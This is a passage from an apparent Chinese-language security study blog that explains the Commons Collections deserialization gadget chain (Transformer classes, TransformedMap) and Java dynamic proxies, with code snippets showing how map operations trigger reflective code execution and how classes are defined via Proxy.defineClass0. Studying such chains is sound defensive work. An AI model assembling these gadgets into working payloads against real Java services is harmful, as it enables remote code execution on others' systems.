java">Transformer<br>ConstantTransformer<br>InvokerTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure><p>作用很简单，往这个类的构造函数传入一个 Object，然后重写的 transform 会返回这个 Object，后面说到的<code>TransformerMap.decorate(Map,Transformer,Transformer).put(&quot;a&quot;,&quot;b&quot;)</code>返回的就不是字符”a b”而是<code>Runtime.getRuntime()</code></p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>跟进源码也很容易理解，往构造函数传入方法名，参数类型，参数列表，重写的 transform 反射进行了命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>()&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><blockquote><p>导入的是<code>org.apache.commons.collections.Transformer</code>，而不是<code>javax.xml.transform.Transformer;</code></p></blockquote><p><code>Transformer</code>是一个接口，只有一个方法<code>public Object transform(Object input);</code></p><p>通过<code>Transformer</code>数组存储了<code>ConstantTransformer、InvokerTransformer</code>实例对象，<code>ConstantTransformer、InvokerTransformer</code>均实现了可序列化接口，并且都重写了<code>transform</code>这个方法</p><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>也实现了<code>Transformer</code>接口，可以将多个<code>Transformer</code>对象串在一起，<code>ChainedTransformer</code>构造函数接受的是<code>Transformer</code>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure><p>贴一下 p 牛的图</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220820153609531.png"></p><h4 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">put</span><span class="hljs-params">(Object key, Object value)</span> </span>&#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformKey</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformValue</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>&#125;<br></code></pre></td></tr></table></figure><p>可见这个类用于修饰 Map，修饰过的 Map 在添加新元素的时候可以执行一个回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<span class="hljs-comment">//decorate调用了构造函数，赋值valueTransformer，keyTransformer</span><br><br><span class="hljs-comment">//1.TransformedMap.decorate.put触发</span><br>decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//随便添加新元素触发传入的，上面是keyTransformer为null，那么将是调用valueTransformer.transform方法(put(&quot;a&quot;,&quot;b&quot;)，transformKey和transformValue都会去调用，因此填入decorate方法的参数顺序不影响最终的结果)，即此时触发TransformedMap.transform，进而调用chainedTransformer.transform，最后Transformer数组元素一个个调用transform方法，成功RCE</span><br><br><span class="hljs-comment">//2.修改value触发</span><br>hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//必须要先存入随意的键值对，下面两行代码修改这个键值对的值触发</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><p>就像研究反序列化一样，我们可以自定义<code>writeObject</code>，写入我们想要写入的；动态代理通过 Java 的反射机制，劫持到所持有的委托类对象的相关方法，成为特定的服务；这样做一是隔绝了直接调用相关业务类的方法或者比静态代理(代码写死)更加灵活，通过代理类来调用一些方法；也可以自定义一些方法在其中（面向切面编程：切入点前执行 aaa，切入点后执行 bbb），这样可以完成对程序的无侵入式扩展</p><p><strong>Java 动态代理主要使用场景：</strong></p><ol><li>统计方法执行所耗时间</li><li>在方法执行前后添加日志</li><li>检测方法的参数或返回值</li><li>方法访问权限控制</li><li>方法<code>Mock</code>测试</li></ol><h6 id="java-lang-reflect-Proxy"><a href="#java-lang-reflect-Proxy" class="headerlink" title="java.lang.reflect.Proxy"></a>java.lang.reflect.Proxy</h6><p>生成动态代理类，创建代理类实例，实现了<code>Serializable</code>接口</p><p>主要方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2020/1/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h6 id="java-lang-reflect-InvocationHandler"><a href="#java-lang-reflect-InvocationHandler" class="headerlink" title="java.lang.reflect.InvocationHandler"></a>java.lang.reflect.InvocationHandler</h6><p>用于调用<code>java.lang.reflect.Proxy</code>生成的代理类方法，接口中只定义了一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并</span><br><span class="hljs-comment"> * 将其指派到它的调用处理程序的 invoke 方法。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在代理实例上处理方法调用并返回结果。在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy  在其上调用方法的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method 对应于在代理实例上调用的接口方法的 Method 实例。Method 对象的声明类将是在其中声明</span><br><span class="hljs-comment">     *               方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args   包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，</span><br><span class="hljs-comment">     *               则为 null。基本类型的参数被包装在适当基本包装器类（如 java.lang.Integer</span><br><span class="hljs-comment">     *               或 java.lang.Boolean）的实例中。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 从代理实例的方法调用返回的值。如果接口方法的声明返回类型是基本类型，</span><br><span class="hljs-comment">     * 则此方法返回的值一定是相应基本包装对象类的实例；否则，它一定是可分配到声明返回类型的类型。</span><br><span class="hljs-comment">     * 如果此方法返回的值为 null 并且接口方法的返回类型是基本类型，则代理实例上的方法调用将抛出</span><br><span class="hljs-comment">     * NullPointerException。否则，如果此方法返回的值与上述接口方法的声明返回类型不兼容，</span><br><span class="hljs-comment">     * 则代理实例上的方法调用将抛出 ClassCastException。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable 从代理实例上的方法调用抛出的异常。该异常的类型必须可以分配到在接口方法的</span><br><span class="hljs-comment">     *                   throws 子句中声明的任一异常类型或未经检查的异常类型 java.lang.RuntimeException 或</span><br><span class="hljs-comment">     *                   java.lang.Error。如果此方法抛出经过检查的异常，该异常不可分配到在接口方法的 throws 子句中</span><br><span class="hljs-comment">     *                   声明的任一异常类型，代理实例的方法调用将抛出包含此方法曾抛出的异常的</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="使用-java-lang-reflect-Proxy-动态创建类对象"><a href="#使用-java-lang-reflect-Proxy-动态创建类对象" class="headerlink" title="使用 java.lang.reflect.Proxy 动态创建类对象"></a>使用 java.lang.reflect.Proxy 动态创建类对象</h5><p><code>ClassLoader</code>和<code>Unsafe</code>都有一个叫做<code>defineClassXXX</code>的<code>native</code>方法，我们可以通过调用这个<code>native</code>方法动态的向<code>JVM</code>创建一个类对象，而<code>java.lang.reflect.Proxy</code>类恰好也有这么一个<code>native</code>方法，所以我们也将可以通过调用<code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法实现动态创建类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyDefineclass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassPool cp = ClassPool.getDefault();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>            CtClass ctClass = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;java.lang.System.out.println(\&quot;hello\&quot;);&quot;</span>;<br>            ctClass.makeClassInitializer().insertBefore(cmd);<br>            ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>            <span class="hljs-keyword">byte</span>[] classbyte = ctClass.toBytecode();<br>            System.out.println();<br>            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();<br>            Method defineClass0 = Proxy.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass0&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;ClassLoader.class, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class&#125;);<br>            defineClass0.setAccessible(<span class="hljs-keyword">true</span>);<br>            Class invokedefineclass0 = (Class) defineClass0.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;systemClassLoader, <span class="hljs-string">&quot;Cat&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length&#125;);<br>            System.out.println(invokedefineclass0);<br>        &#125; <span class="hljs-keyword">catch</span> (CannotCompileException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 NotFoundException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>动态代理生成出来的类有如下技术细节和特性：</strong></p><ol><li>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(<code>反射机制</code>)。</li><li>动态代理类会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>创建。</li><li><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并调用<code>java.lang.reflect.Proxy.defineClass0()</code>方法将该类注册到<code>JVM</code>。</li><li>该类继承于<code>java.lang.reflect.Proxy</code>并实现了需要被代理的接口类，因为<code>java.lang.reflect.Proxy</code>类实现了<code>java.io.Serializable</code>接口，所以被代理的类支持<code>序列化/反序列化</code>。</li><li>该类实现了代理接口类(示例中的接口类是<code>com.anbai.sec.proxy.FileSystem</code>)，会通过<code>ProxyGenerator</code>动态生成接口类(<code>FileSystem</code>)的所有方法，</li><li>该类因为实现了代理的接口类，所以当前类是代理的接口类的实例(<code>proxyInstance instanceof FileSystem</code>为<code>true</code>)，但不是代理接口类的实现类的实例(<code>proxyInstance instanceof UnixFileSystem</code>为<code>false</code>)。</li><li>该类方法中包含了被代理的接口类的所有方法，通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果。</li><li>该类代理的方式重写了<code>java.lang.Object</code>类的<code>toString</code>、<code>hashCode</code>、<code>equals</code>方法。</li><li>如果动过动态代理生成了多个动态代理类，新生成的类名中的<code>0</code>会自增，如<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</li></ol><h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassMapDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandlerDemo invocationHandlerDemo = <span class="hljs-keyword">new</span> InvocationHandlerDemo(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandlerDemo);<br>        System.out.println(proxyMap.put(<span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>));<br>        proxyMap.get(<span class="hljs-string">&quot;proxy&quot;</span>);<br>        proxyMap.entrySet();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvocationHandlerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Object map;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvocationHandlerDemo</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().contains(<span class="hljs-string">&quot;put&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook Map.put Method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;detect the method: &quot;</span> + method.getName() + <span class="hljs-string">&quot;, and exec without being hooked&quot;</span>);<br>        <span 